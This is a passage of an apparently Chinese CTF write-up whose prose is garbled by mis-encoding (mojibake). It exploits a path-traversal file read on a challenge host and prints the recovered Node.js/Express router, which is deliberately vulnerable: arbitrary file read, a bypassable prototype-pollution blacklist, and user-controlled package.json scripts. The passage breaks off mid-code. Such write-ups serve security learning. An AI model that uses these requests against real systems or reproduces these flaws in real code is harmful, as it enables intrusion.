<span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// set router</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>,indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/user&quot;</span>,userRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/dashboardIndex&quot;</span>,dashboardIndexRouter);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>,<span class="function">() =&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®è¿™ä¸ªä»£ç </p><p><img src="../images/image-20230504193939368.png" alt="image-20230504193939368"></p><p><img src="../images/image-20230504194038107.png" alt="image-20230504194038107"></p><p>è¿™å°±æ˜¯å¼•å…¥çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•è¿›è¡Œè¿™ä¸ªæ–‡ä»¶çš„è¯»å–ï¼Œçœ‹é‡Œé¢æœ‰å•¥åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ä¸€å¼€å§‹è¿˜æŠ¥é”™æ˜¯å› ä¸ºæ²¡æœ‰åŠ åç¼€.jsï¼Œå°±å¥½åƒè®¿é—®phpé¡µé¢ä¸åŠ phpä¸€æ ·</span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=/proc/self/cwd/routes/dashbo</span><br><span class="line">ardIndex.js</span><br><span class="line"></span><br><span class="line">è¿™ä¸ªè·¯å¾„å¯èƒ½ä¹Ÿæ˜¯è¿™ä¸ªæ¡†æ¶é»˜è®¤çš„è·¯å¾„å§ï¼Œåº”è¯¥å’Œthinkphpå·®ä¸å¤š</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=./routes/dashboardIndex.js</span><br><span class="line">ä¸Šé¢çš„äºŒç§æ–¹æ³•éƒ½å¯ä»¥å®ç°</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230504194423815.png" alt="image-20230504194423815"></p><p>è¯»å–åˆ°çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/tmp&quot;</span>)&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileData</span>(<span class="params">fileDatas</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blacklist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileDatas.<span class="title function_">includes</span>(blacklist[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get example file</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/ShowExampleFile&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>([req.<span class="property">query</span>].<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;app&quot;</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">filename</span> || <span class="string">&quot;./example/example.json&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Home&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>:<span class="string">&quot;Welcome back&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/getHint2&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> hintName = <span class="string">&quot;hint2.png&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">root</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../hints&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(hintName,options,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Get hint2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// show uploaded files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/UploadList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No uploaded files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: lists,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// show packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PacksList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No packed files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lists.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        result += <span class="string">&quot;&lt;a href=&#x27;/dashboardIndex/DownloadPackage?name=&quot;</span> + lists[i] + <span class="string">&quot;&#x27;&gt;&quot;</span> + lists[i] + <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: result,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Download packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/DownloadPackage&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">query</span>.<span class="property">name</span> === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        req.<span class="property">query</span>.<span class="property">name</span> = <span class="string">&quot;example.tgz&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> packageName = req.<span class="property">query</span>.<span class="property">name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>) !== -<span class="number">1</span> || packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;..&quot;</span>) !== -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;.tgz&quot;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a package file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> packagePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs/&quot;</span>,packageName);</span><br><span class="line">    <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(packagePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> contentType = <span class="string">&quot;application/x-gtar&quot;</span>;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span> + packageName);</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-type&quot;</span>, contentType);</span><br><span class="line">    res.<span class="title function_">download</span>(packagePath,packageName,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Download failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Upload files</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/Upload&quot;</span>,upload.<span class="title function_">any</span>(),<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;upload&quot;</span>,&#123;<span class="attr">upload_result</span>:<span class="string">&quot;plz upload file&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!req.<span class="property">files</span> || <span class="title class_">Object</span>.<span class="title function_">keys</span>(req.<span class="property">files</span>).<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;No files were uploaded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> file = req.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;/&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">includes</span>(<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> fileData = fs.<span class="title function_">readFileSync</span>(file.<span class="property">path</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(fileData))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File data invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload/&quot;</span>,file.<span class="property">originalname</span>);</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="title function_">extname</span>(file.<span class="property">originalname</span>) === <span class="string">&quot;.json&quot;</span>) &#123;</span><br><span class="line">            fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload error&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;File upload success&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;Not a JSON file&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set dependencies</span></span><br><span class="line">router.<span class="title function_">all</span>(<span class="string">&quot;/SetDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&quot;You are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;You can post the dependencies here&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> data = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> data !== <span class="string">&quot;object&quot;</span> &amp;&amp; data === &#123;&#125;)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;plz set the dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkFileData</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)))&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Invalid dependencies&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> exampleJson = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;app-example&quot;</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: <span class="string">&quot;Example app for the Node.js Getting Started guide.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;author&quot;</span>: <span class="string">&quot;anonymous&quot;</span>,</span><br><span class="line">            <span class="string">&quot;scripts&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;prepack&quot;</span>: <span class="string">&quot;echo &#x27;packing dependencies&#x27;&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">            <span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        exampleJson = <span class="title class_">Object</span>.<span class="title function_">assign</span>(exampleJson,&#123;&#125;,data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> filePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/package.json&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> fileData = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(exampleJson);</span><br><span class="line"></span><br><span class="line">        fs.<span class="title function_">writeFile</span>(filePath,fileData,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err)&#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies error&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Set dependencies success&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pack dependencies</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PackDependencies&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_admin</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;You are not admin&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Packing dependencies...&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> filePath = 